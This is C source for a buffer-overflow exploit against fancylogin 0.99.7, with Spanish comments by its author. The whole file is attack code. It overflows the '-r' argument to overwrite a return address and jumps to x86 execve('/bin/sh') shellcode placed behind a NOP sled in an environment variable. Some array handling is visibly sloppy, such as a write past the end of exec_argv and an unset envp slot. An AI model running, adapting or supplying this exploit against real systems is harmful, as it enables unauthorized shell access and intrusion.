/*
 * TILE: fancylogin 0.99.7 exploit
 *
 * CODER: Ripe - <ripe@7a69ezine.org>
 *
 * NOTA: Salta a la shellcode al retornar main() asi que tendremos que
 *       ejecutar "./fancyxpl fancylogin" e introducir 5 logins fallidos
 *       para que main retorne. Que yo sepa fancylogin no tiene suid, por
 *       lo que este exploit no elevara privilegios, peeero... aqui esta
 *       por si algun admin es despistado O:-)
 */

#include <stdio.h>
#include <unistd.h>

#define ENVBUF_SIZE     8192
#define EVILBUF_SIZE     312        /* 256+4+4 */ 
#define NOP		0x90
#define RET_ADDR        0xBFFFFF50  /* Por ahi suele estar environ :) */

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh\0";

int main(int argc, char **argv) {
  char *exec_argv[3];
  char *exec_envp[4];
  char envbuf[ENVBUF_SIZE+1];
  char evilbuf[EVILBUF_SIZE+1];
  unsigned long *ptr=&evilbuf[256-1];
  if (argc<2) {
    printf("Usage: %s <prog>\n", argv[0]);
    exit(0);
  }
  memset(envbuf, 0, ENVBUF_SIZE+1);
  memset(envbuf, NOP, ENVBUF_SIZE);
  memset(evilbuf, 0, EVILBUF_SIZE+1);
  memset(evilbuf, 'A', EVILBUF_SIZE);
  memcpy(envbuf, "ENV=", 4);
  memcpy(envbuf+(ENVBUF_SIZE-strlen(shellcode)), shellcode, strlen(shellcode));
  (*ptr)=RET_ADDR;
  exec_argv[0]=argv[1];
  exec_argv[1]="-r";
  exec_argv[2]=evilbuf;
  exec_argv[3]=NULL;
  exec_envp[0]=envbuf;
  exec_envp[2]=NULL;
  printf("Exploting...\n");
  execve(argv[1], exec_argv, exec_envp);
  printf("Something bad!\n");
}
